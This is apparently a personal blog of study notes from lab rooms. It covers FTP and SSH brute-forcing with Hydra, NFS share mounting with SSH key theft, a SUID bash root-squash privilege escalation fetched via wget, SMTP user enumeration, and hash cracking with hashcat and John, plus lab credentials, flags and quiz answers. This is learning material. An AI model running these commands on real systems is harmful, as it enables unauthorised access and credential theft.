<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -v 10.10.53.228</span><br><span class="line">ftp 10.10.53.228</span><br><span class="line">get PUBLIC_NOTICE.txt</span><br></pre></td></tr></table></figure>

<p>Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.</p>
<p>When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Hydra</span><br><span class="line"></span><br><span class="line">Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.</span><br><span class="line">The syntax for the command we&#x27;re going to use to find the passwords is this:</span><br><span class="line"></span><br><span class="line">&quot;hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp&quot;</span><br><span class="line">Let&#x27;s break it down:</span><br><span class="line"></span><br><span class="line">SECTION             FUNCTION</span><br><span class="line"></span><br><span class="line">hydra                   Runs the hydra tool</span><br><span class="line"></span><br><span class="line">-t 4                    Number of parallel connections per target</span><br><span class="line"></span><br><span class="line">-l [user]               Points to the user who&#x27;s account you&#x27;re trying to compromise</span><br><span class="line"></span><br><span class="line">-P [path to dictionary] Points to the file containing the list of possible passwords</span><br><span class="line"></span><br><span class="line">-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt</span><br><span class="line"></span><br><span class="line">[machine IP]            The IP address of the target machine</span><br><span class="line"></span><br><span class="line">ftp / protocol          Sets the protocol</span><br><span class="line"></span><br><span class="line">Let&#x27;s crack some passwords!</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.53.228 ftp</span><br><span class="line">ftp 10.10.53.228</span><br><span class="line">get ftp.txt</span><br></pre></td></tr></table></figure>

<h3 id="Network-Services2"><a href="#Network-Services2" class="headerlink" title="Network Services2"></a>Network Services2</h3><p><strong>NFS</strong> : NFS stands for “Network File System” and allows a system to share directories and files with others over a network.————<strong>default port : 2049</strong></p>
<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html">https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html</a></p>
<p>If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:</p>
<ul>
<li>The file handle</li>
<li>The name of the file to be accessed</li>
<li>The user’s, user ID</li>
<li>The user’s group ID</li>
</ul>
<p>These are used in determining access rights to the specified file. </p>
<p>Benefits : Apart from allowing local access to remote files, NFS is most notable for its host authentication, it’s simple to do and makes it possible to connect to another service using an IP address only.</p>
<p><a target="_blank" rel="noopener" href="https://www.datto.com/blog/what-is-nfs-file-share">https://www.datto.com/blog/what-is-nfs-file-share</a></p>
<p><a target="_blank" rel="noopener" href="http://nfs.sourceforge.net/">http://nfs.sourceforge.net/</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/NFS">https://wiki.archlinux.org/index.php/NFS</a></p>
<p>What does NFS stand for?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Network File System</span><br></pre></td></tr></table></figure>

<p>What process allows an NFS client to interact with a remote directory as though it was a physical device?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>

<p>What does NFS use to represent files and directories on the server?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file handle</span><br></pre></td></tr></table></figure>

<p>What protocol does NFS use to communicate between the server and client?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RPC</span><br></pre></td></tr></table></figure>

<p>What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 &#x2F; parameter 2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user id/group id</span><br></pre></td></tr></table></figure>

<p>Can a Windows NFS server share files with a Linux client? (Y&#x2F;N)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y</span><br></pre></td></tr></table></figure>

<p>Can a Linux NFS server share files with a MacOS client? (Y&#x2F;N)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y</span><br></pre></td></tr></table></figure>

<p>What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.2</span><br></pre></td></tr></table></figure>

<p><strong>nfs-common</strong>                &#x2F;&#x2F;<em>sudo apt install nfs-common</em></p>
<p><strong>Mounting NFS shares</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/showmount -e 10.10.230.217                ///home</span><br><span class="line">mkdir /tmp/mount</span><br><span class="line">sudo mount -t nfs 10.10.230.217:home /tmp/mount/ -nolock</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>Tag</strong></th>
<th><strong>Function</strong></th>
</tr>
</thead>
<tbody><tr>
<td>sudo</td>
<td>Run as root</td>
</tr>
<tr>
<td>mount</td>
<td>Execute the mount command</td>
</tr>
<tr>
<td>-t nfs</td>
<td>Type of device to mount, then specifying that it’s NFS</td>
</tr>
<tr>
<td>IP:share</td>
<td>The IP Address of the NFS server, and the name of the share we wish to mount</td>
</tr>
<tr>
<td>-nolock</td>
<td>Specifies not to use NLM locking</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/mount</span><br><span class="line">cd /cappucino/.ssh</span><br><span class="line">cp id_rsa /home/yake-daigua/Desktop</span><br><span class="line">ssh -i id_rsa cappucino@10.10.230.217</span><br></pre></td></tr></table></figure>

<p>  NFS Access -&gt;</p>
<p>​    Gain Low Privilege Shell -&gt;</p>
<p>​      Upload Bash Executable to the NFS share -&gt;</p>
<p>​        Set SUID Permissions Through NFS Due To Misconfigured Root Squash -&gt;</p>
<p>​          Login through SSH -&gt;</p>
<p>​            Execute SUID Bit Bash Executable -&gt;</p>
<p>​              ROOT ACCESS</p>
<p>First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user’s home directory.</p>
<p>Download the bash executable to your Downloads directory. Then use “cp ~&#x2F;Downloads&#x2F;bash .” to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using “sudo chown root bash”</p>
<p><strong>Now, we’re going to add the SUID bit permission</strong> to the bash executable we just copied to the share using “sudo chmod +[permission] bash”. What letter do we use to set the SUID bit set using chmod?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s             //s 在文件执行时把进程的属主或组ID置为该文件的文件属主。方式“u＋s”设置文件的用户ID位，“g＋s”设置组ID位。</span><br></pre></td></tr></table></figure>

<p>Let’s do a sanity check, let’s check the permissions of the “bash” executable using “ls -la bash”. What does the permission set look like? Make sure that it ends with -sr-x.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-sr-x</span><br></pre></td></tr></table></figure>

<p>Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with “<em>.&#x2F;bash -p</em>“. <strong>The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash</span><br><span class="line">chmod +s bash</span><br><span class="line">cp bash /tmp/mount/cappucino</span><br><span class="line">./bash -p</span><br></pre></td></tr></table></figure>



<p><strong>SMTP</strong>————-default port : 25</p>
<p>The SMTP server performs three basic functions:</p>
<ul>
<li>It verifies who is sending emails through the SMTP server.</li>
<li>It sends the outgoing mail</li>
<li>If the outgoing mail can’t be delivered it sends the message back to the sender</li>
</ul>
<p><strong>POP and IMAP</strong></p>
<p>POP, or “Post Office Protocol” and IMAP, “Internet Message Access Protocol” are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP’s more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP&#x2F;IMAP server is responsible for fulfiling this process.</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221127202211547.png" alt="image-20221127202211547"></p>
<p><a target="_blank" rel="noopener" href="https://computer.howstuffworks.com/e-mail-messaging/email3.htm">https://computer.howstuffworks.com/e-mail-messaging/email3.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.afternerd.com/blog/smtp/">https://www.afternerd.com/blog/smtp/</a></p>
<p>What does SMTP stand for?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Simple Mail Transfer Protrol</span><br></pre></td></tr></table></figure>

<p>What does SMTP handle the sending of? (answer in plural)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emails</span><br></pre></td></tr></table></figure>

<p>What is the first step in the SMTP process?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMTP handshake</span><br></pre></td></tr></table></figure>

<p>What is the default SMTP port?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure>

<p>Where does the SMTP server send the email if the recipient’s server is not available?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMTP queue</span><br></pre></td></tr></table></figure>

<p>On what server does the Email ultimately end up on?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP/IMAP</span><br></pre></td></tr></table></figure>

<p>Can a Linux machine run an SMTP server? (Y&#x2F;N)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y</span><br></pre></td></tr></table></figure>

<p>Can a Windows machine run an SMTP server? (Y&#x2F;N)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y</span><br></pre></td></tr></table></figure>



<p><strong>Enumerating Server Details</strong></p>
<p>Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We’re going to use the “<em><strong>smtp_version</strong></em>“ module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.</p>
<p><strong>Enumerating Users from SMTP</strong></p>
<p>The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users</p>
<p>We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called “<em>smtp_enum</em>“ that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.</p>
<p>Of course , you can use other tools , such as <strong><code>smtp-user-enum</code></strong> etc.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">search smtp_version</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts 10.10.137.74</span><br><span class="line">set threads 32</span><br><span class="line">run</span><br><span class="line">back</span><br><span class="line">search smtp_enum</span><br><span class="line">show options</span><br><span class="line">set rhosts 10.10.137.74</span><br><span class="line">set user_file /usr/share/seclists/Usernames/top-usernames-shortlist.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><strong>We’re going to be using the <em>“top-usernames-shortlist.txt”</em> wordlist from the Usernames subsection of seclists (&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Usernames if you have it installed).</strong></p>
<p><strong>Seclists is an amazing collection of wordlists. If you’re running Kali or Parrot you can install seclists with: “sudo apt install seclists” Alternatively, you can download the repository from <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">here</a>.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/seclists</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh</span><br></pre></td></tr></table></figure>



<p><strong>MYSQL</strong></p>
<p>Metasploit : mysql_sql          mysql_schemadump</p>
<p><a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/mysql-enum.html">https :&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F; scripts&#x2F;mysql-enum.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/23081">https://www.exploit-db.com/exploits/23081</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h [IP] -u [username] -p</span><br></pre></td></tr></table></figure>





<h1 id="Web-Hacking-Fundamentals"><a href="#Web-Hacking-Fundamentals" class="headerlink" title="Web Hacking Fundamentals"></a>Web Hacking Fundamentals</h1><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTPS : Hyper Text Transfer Protocol Secure</p>
<table>
<thead>
<tr>
<th><strong>200 - OK</strong></th>
<th>The request was completed successfully.</th>
</tr>
</thead>
<tbody><tr>
<td><strong>201 - Created</strong></td>
<td>A resource has been created (for example a new user or new blog post).</td>
</tr>
<tr>
<td><strong>301 - Permanent Redirect</strong></td>
<td>This redirects the client’s browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead.</td>
</tr>
<tr>
<td><strong>302 - Temporary Redirect</strong></td>
<td>Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future.</td>
</tr>
<tr>
<td><strong>400 - Bad Request</strong></td>
<td>This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn’t send.</td>
</tr>
<tr>
<td><strong>401 - Not Authorised</strong></td>
<td>You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password.</td>
</tr>
<tr>
<td><strong>403 - Forbidden</strong></td>
<td>You do not have permission to view this resource whether you are logged in or not.</td>
</tr>
<tr>
<td><strong>405 - Method Not Allowed</strong></td>
<td>The resource does not allow this method request, for example, you send a GET request to the resource &#x2F;create-account when it was expecting a POST request instead.</td>
</tr>
<tr>
<td><strong>404 - Page Not Found</strong></td>
<td>The page&#x2F;resource you requested does not exist.</td>
</tr>
<tr>
<td><strong>500 - Internal Service Error</strong></td>
<td>The server has encountered some kind of error with your request that it doesn’t know how to handle properly.</td>
</tr>
<tr>
<td><strong>503 - Service Unavailable</strong></td>
<td>This server cannot handle your request as it’s either overloaded or down for maintenance.</td>
</tr>
</tbody></table>
<p><strong>Host:</strong> Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you’ll just receive the default website for the server.</p>
<p><strong>User-Agent:</strong> This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HTML, JavaScript and CSS are only available in certain browsers.</p>
<p><strong>Content-Length:</strong> When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn’t missing any data.</p>
<p><strong>Accept-Encoding:</strong> Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet.</p>
<p><strong>Cookie:</strong> Data sent to the server to help remember your information (see cookies task for more information).</p>
<p><strong>Common Response Headers</strong></p>
<p>These are the headers that are returned to the client from the server after a request.</p>
<p><strong>Set-Cookie:</strong> Information to store which gets sent back to the web server on each request (see cookies task for more information).</p>
<p><strong>Cache-Control:</strong> How long to store the content of the response in the browser’s cache before it requests it again.</p>
<p><strong>Content-Type:</strong> This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data.</p>
<p><strong>Content-Encoding:</strong> What method has been used to compress the data to make it smaller when sending it over the internet.</p>
<h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><table>
<thead>
<tr>
<th><code>Ctrl + Shift + D</code></th>
<th>Switch to the Dashboard</th>
</tr>
</thead>
<tbody><tr>
<td><code>Ctrl + Shift + T</code></td>
<td>Switch to the Target tab</td>
</tr>
<tr>
<td><code>Ctrl + Shift + P</code></td>
<td>Switch to the Proxy tab</td>
</tr>
<tr>
<td><code>Ctrl + Shift + I</code></td>
<td>Switch to the Intruder tab</td>
</tr>
<tr>
<td><code>Ctrl + Shift + R</code></td>
<td>Switch to the Repeater tab</td>
</tr>
</tbody></table>
<h3 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10"></a>OWASP Top 10</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dearsq/article/details/52586320">https://blog.csdn.net/dearsq/article/details/52586320</a></p>
<h3 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h3><p>username : R1ckRul3s</p>
<p>python3 dirsearch.py -u <a target="_blank" rel="noopener" href="http://10.10.190.132/">http://10.10.190.132/</a> </p>
<p><a target="_blank" rel="noopener" href="http://10.10.190.132/robots.txt">http://10.10.190.132/robots.txt</a></p>
<p>password : Wubbalubbadubdub</p>
<p><a target="_blank" rel="noopener" href="http://10.10.190.132/login.php">http://10.10.190.132/login.php</a></p>
<p>flag1 : <a target="_blank" rel="noopener" href="http://10.10.190.132/Sup3rS3cretPickl3Ingred.txt">http://10.10.190.132/Sup3rS3cretPickl3Ingred.txt</a></p>
<p>less &#x2F;home&#x2F;rick&#x2F;second\ ingredients</p>
<p>flag2 : less &#x2F;home&#x2F;rick&#x2F;second\ ingredients</p>
<p>flag3 : sudo less &#x2F;root&#x2F;3rd.txt</p>
<h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h3 id="Hashing-Crypto-101"><a href="#Hashing-Crypto-101" class="headerlink" title="Hashing-Crypto 101"></a>Hashing-Crypto 101</h3><p>encryption &#x2F; encoding</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rainbow table website: </span><br><span class="line"></span><br><span class="line">https://crackstation.net/</span><br><span class="line"></span><br><span class="line">https://md5.cn/</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/173974">https://cloud.tencent.com/developer/news/173974</a></p>
<p>MD5 : <a target="_blank" rel="noopener" href="https://www.mscs.dal.ca/~selinger/md5collision/">https://www.mscs.dal.ca/~selinger/md5collision/</a></p>
<p>SHA1 : <a target="_blank" rel="noopener" href="https://shattered.io/">https://shattered.io/</a></p>
<p>What is the output size in bytes of the MD5 hash function?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16</span><br></pre></td></tr></table></figure>

<p>Can you avoid hash collisions? (Yea&#x2F;Nay)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nay</span><br></pre></td></tr></table></figure>

<p>If you have an 8 bit hash output, how many possible hashes are there?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">256</span><br></pre></td></tr></table></figure>

<p>Here’s a quick table of the most Unix style password prefixes that you’ll see.</p>
<table>
<thead>
<tr>
<th>Prefix</th>
<th>Algorithm</th>
</tr>
</thead>
<tbody><tr>
<td>$1$</td>
<td>md5crypt, used in Cisco stuff and older Linux&#x2F;Unix systems</td>
</tr>
<tr>
<td>$2$, $2a$, $2b$, $2x$, $2y$</td>
<td>Bcrypt (Popular for web applications)</td>
</tr>
<tr>
<td>$6$</td>
<td>sha512crypt (Default for most Linux&#x2F;Unix systems)</td>
</tr>
</tbody></table>
<p>more : <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$2a$06$7yoU3Ng8dHTXphAg913cyO6Bjs3K5lBnwq5FJyA6d01pMSrddr1ZG</span><br><span class="line">hashid &#x27;$2a$06$7yoU3Ng8dHTXphAg913cyO6Bjs3K5lBnwq5FJyA6d01pMSrddr1ZG&#x27;</span><br><span class="line"></span><br><span class="line">//you can also identfy decrypt hashes on website : https://hashes.com/en/tools/hash_identifier</span><br><span class="line"></span><br><span class="line">[+] Blowfish(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board 4.x </span><br><span class="line">[+] bcrypt </span><br><span class="line"></span><br><span class="line">search on : https://hashcat.net/wiki/doku.php?id=example_hashes</span><br><span class="line">//hashcat -h | grep -i &#x27;hmac-sha512 (key = $pass)</span><br><span class="line">hashmode : 3200</span><br><span class="line"></span><br><span class="line">hashcat -m 3200 &#x27;$2a$06$7yoU3Ng8dHTXphAg913cyO6Bjs3K5lBnwq5FJyA6d01pMSrddr1ZG&#x27; /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 3200 &#x27;$2a$06$7yoU3Ng8dHTXphAg913cyO6Bjs3K5lBnwq5FJyA6d01pMSrddr1ZG&#x27; /usr/share/wordlists/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<h3 id="John-The-Ripper"><a href="#John-The-Ripper" class="headerlink" title="John The Ripper"></a>John The Ripper</h3><p>john –list&#x3D;formats | grep -iF “ntlm”</p>
<p><strong>hash</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashid &#x27;2e728dd31fb5949bc39cac5a9f066498&#x27;</span><br><span class="line">//python3 hash-id.py</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash1.txt</span><br><span class="line"></span><br><span class="line">python3 hash-id.py   //5460C85BD858A11475115D2DD3A82333</span><br><span class="line">john –list=formats | grep -iF &quot;ntlm&quot;</span><br><span class="line">john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br></pre></td></tr></table></figure>



<p><strong>&#x2F;etc&#x2F;shadow Hashes</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo root:x:0:0::/root:/bin/bash &gt;1.txt</span><br><span class="line">echo root:$6$Ha.d5nGupBm29pYr$yugXSk24ZljLTAZZagtGwpSQhb3F2DOJtnHrvk7HI2ma4GsuioHp8sm3LJiRJpKfIf7lZQ29qgtH17Q/JDpYM/:18576:::::: &gt; 2.txt    //it&#x27;s worng,pleaseuse vim </span><br><span class="line">unshadow 1.txt 2.txt&gt;3.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt 3.txt</span><br></pre></td></tr></table></figure>



<p><strong>Single Crack Mode</strong></p>
<p>The best way to show what Single Crack mode is, and what word mangling is, is to actually go through an example:</p>
<p>If we take the username: Markus</p>
<p>Some possible passwords could be:</p>
<ul>
<li>Markus1, Markus2, Markus3 (etc.)</li>
<li>MArkus, MARkus, MARKus (etc.)</li>
<li>Markus!, Markus$, Markus* (etc.)</li>
</ul>
<p>This technique is called word mangling. John is building it’s own dictionary based on the information that it has been fed and uses a set of rules called “mangling rules” which define how it can mutate the word it started with to generate a wordlist based off of relevant factors for the target you’re trying to crack. This is exploiting how poor passwords can be based off of information about the username, or the service they’re logging into.</p>
<p><strong>GECOS</strong></p>
<p>John’s implementation of word mangling also features compatibility with the Gecos fields of the UNIX operating system, and other UNIX-like operating systems such as Linux. So what are Gecos? Remember in the last task where we were looking at the entries of both &#x2F;etc&#x2F;shadow and &#x2F;etc&#x2F;passwd? Well if you look closely You can see that each field is seperated by a colon “:”. Each one of the fields that these records are split into are called Gecos fields. John can take information stored in those records, such as full name and home directory name to add in to the wordlist it generates when cracking &#x2F;etc&#x2F;shadow hashes with single crack mode.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --single --format=Raw-MD5 hash7.txt</span><br><span class="line">//hash7.txt Joker:7bf6d9bb82bed1302f331fc6b816aada</span><br><span class="line">//password : Jok3r</span><br></pre></td></tr></table></figure>



<p><strong>Custom Rules</strong></p>
<p><code>Az</code> - Takes the word and appends it with the characters you define</p>
<p><code>A0</code> - Takes the word and prepends it with the characters you define</p>
<p><code>c</code> - Capitalises the character positionally</p>
<p>Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets <code>[ ]</code> in the order they should be used. These directly follow the modifier patterns inside of double quotes <code>&quot; &quot;</code>. Here are some common examples:</p>
<p><code>[0-9]</code> - Will include numbers 0-9</p>
<p><code>[0]</code> - Will include only the number 0</p>
<p><code>[A-z]</code> - Will include both upper and lowercase</p>
<p><code>[A-Z]</code> - Will include only uppercase letters</p>
<p><code>[a-z]</code> - Will include only lowercase letters</p>
<p><code>[a]</code> - Will include only a</p>
<p><code>[!£$%@]</code> - Will include the symbols !£$%@</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cAz&quot;[0-9] [!£$%@]&quot;</span><br><span class="line"></span><br><span class="line">In order to:</span><br><span class="line">Capitalise the first  letter - c</span><br><span class="line">Append to the end of the word - Az</span><br><span class="line">A number in the range 0-9 - [0-9]</span><br><span class="line">Followed by a symbol that is one of [!£$%@]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]</span><br></pre></td></tr></table></figure>



<p><strong>Zip&#x2F;RAR Files</strong></p>
<p>Similarly to the unshadow tool that we used previously, we’re going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:</p>
